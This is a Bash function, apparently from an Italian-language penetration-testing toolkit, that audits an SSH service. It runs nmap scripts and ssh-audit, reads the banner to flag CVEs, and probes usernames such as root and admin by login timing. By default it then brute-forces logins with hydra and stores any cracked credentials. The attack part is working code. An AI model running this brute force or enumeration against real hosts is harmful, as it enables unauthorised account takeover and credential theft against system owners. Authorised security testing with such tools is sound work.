cmd_ssh() {
    local target="" port=22 do_brute=1 threads=4
    while [[ $# -gt 0 ]]; do
        case "$1" in
            --port)          _req_arg "$1" "${2:-}"; port="$2";           shift 2 ;;
            --no-bruteforce) do_brute=0;          shift ;;
            --userlist)      _req_arg "$1" "${2:-}"; CUSTOM_USERS="$2";   shift 2 ;;
            --passlist)      _req_arg "$1" "${2:-}"; CUSTOM_PASS="$2";    shift 2 ;;
            --threads)       _req_arg "$1" "${2:-}"; threads="$2";        shift 2 ;;
            --output)        _req_arg "$1" "${2:-}"; OUTDIR_BASE="$2";    shift 2 ;;
            --dry-run)       DRY_RUN=1;           shift ;;
            --help|-h)       usage_ssh; exit 0 ;;
            -*)              err "Opzione sconosciuta: $1"; usage_ssh; exit 1 ;;
            *)               target="$1"; shift ;;
        esac
    done
    [[ -z "$target" ]] && { err "TARGET mancante"; usage_ssh; exit 1; }
    validate_target "$target"
    setup_outdir "$target" "ssh"
    log "Target: $target:$port | Output: $OUTDIR"

    section "Nmap SSH NSE Scripts"
    run_cmd "nmap_ssh" \
        "nmap -p $port \
         --script ssh-hostkey,ssh-auth-methods,ssh2-enum-algos \
         -oN \"$OUTDIR\"/nmap_ssh.txt $target 2>&1"

    section "SSH-Audit (algoritmi e vulnerabilità)"
    if tool_ok ssh-audit; then
        run_cmd "ssh_audit" "ssh-audit -p $port $target 2>&1 | tee \"$OUTDIR\"/ssh_audit.txt"
    else
        warn "ssh-audit non trovato (apt install ssh-audit) — step saltato"
    fi

    section "SSH Version CVE Check"
    if [[ $DRY_RUN -eq 0 ]]; then
        local ssh_banner
        ssh_banner=$(nc -w 3 "$target" "$port" </dev/null 2>/dev/null | head -1 | tr -d '\r\n' || true)
        echo "Banner: $ssh_banner" >> "$OUTDIR/ssh_version.txt"
        if [[ -n "$ssh_banner" ]]; then
            log "SSH banner: $ssh_banner"
            # OpenSSH < 7.7 — CVE-2018-15473 user enumeration
            local ver; ver=$(echo "$ssh_banner" | grep -oP 'OpenSSH[_ ][\d.]+' | grep -oP '[\d.]+' | head -1 || true)
            if [[ -n "$ver" ]]; then
                if awk "BEGIN{exit !($ver < 7.7)}"; then
                    found HIGH "SSH:$port — OpenSSH $ver vulnerabile a CVE-2018-15473 (username enumeration)"
                fi
                if awk "BEGIN{exit !($ver < 7.6)}"; then
                    found HIGH "SSH:$port — OpenSSH $ver vulnerabile a CVE-2018-10933 (libssh auth bypass, se presente)"
                fi
                if awk "BEGIN{exit !($ver < 6.9)}"; then
                    found HIGH "SSH:$port — OpenSSH $ver versione molto vecchia, molteplici CVE noti"
                fi
            fi
        fi
    fi

    section "SSH Username Enumeration (CVE-2018-15473)"
    if [[ $DRY_RUN -eq 0 ]]; then
        if tool_ok ssh; then
            local test_users=("root" "admin" "user" "nobody" "invalidxyz99")
            local timing_results=()
            for u in "${test_users[@]}"; do
                local t_start t_end elapsed
                t_start=$(date +%s%N)
                ssh -o BatchMode=yes -o ConnectTimeout=5 \
                    -o StrictHostKeyChecking=no \
                    -p "$port" "${u}@${target}" 2>/dev/null || true
                t_end=$(date +%s%N)
                elapsed=$(( (t_end - t_start) / 1000000 ))
                timing_results+=("${u}:${elapsed}ms")
                echo "User $u: ${elapsed}ms" >> "$OUTDIR/ssh_user_timing.txt"
            done
            log "Timing results: ${timing_results[*]}"
            # Calcola la differenza max tra i tempi di risposta
            local max_t=0 min_t=999999 max_diff=0
            for tr in "${timing_results[@]}"; do
                local t_val; t_val="${tr##*:}"; t_val="${t_val%ms}"
                [[ "$t_val" -gt "$max_t" ]] && max_t="$t_val"
                [[ "$t_val" -lt "$min_t" ]] && min_t="$t_val"
            done
            max_diff=$(( max_t - min_t ))
            echo "Max diff: ${max_diff}ms" >> "$OUTDIR/ssh_user_timing.txt"
            if [[ "$max_diff" -gt 200 ]]; then
                found MEDIUM "SSH:$port — possibile user enumeration via timing (diff: ${max_diff}ms)"
            else
                log "SSH timing: nessuna differenza significativa rilevata (diff: ${max_diff}ms)"
            fi
        fi
    else
        echo -e "${CYAN}[DRY-RUN]${NC} SSH user enumeration timing su $target:$port"
    fi

    if [[ $do_brute -eq 1 ]]; then
        section "SSH Brute Force (hydra)"
        if require_tool hydra; then
            local ul; ul=$(_wl_users); local pl; pl=$(_wl_pass)
            run_cmd "hydra_ssh" \
                "hydra -L \"$ul\" -P \"$pl\" -s $port -t $threads -f -w 4 -W 2 \
                 -o \"$OUTDIR/hydra_ssh.txt\" $target ssh 2>&1"
            if [[ $DRY_RUN -eq 0 && -f "$OUTDIR/hydra_ssh.txt" ]]; then
                grep -i "login:" "$OUTDIR/hydra_ssh.txt" 2>/dev/null \
                    | while IFS= read -r line; do
                        found HIGH "SSH:${port} — $line"
                        local hu; hu=$(echo "$line" | grep -oP 'login:\s*\K\S+' || true)
                        local hp; hp=$(echo "$line" | grep -oP 'password:\s*\K\S+' || true)
                        [[ -n "$hu" && -n "$hp" ]] && \
                            _cred_store_add ssh "$target" "$port" "$hu" "$hp" "ssh:hydra"
                      done || true
            fi
        fi
    fi

    ok "SSH audit completato → $OUTDIR"
}

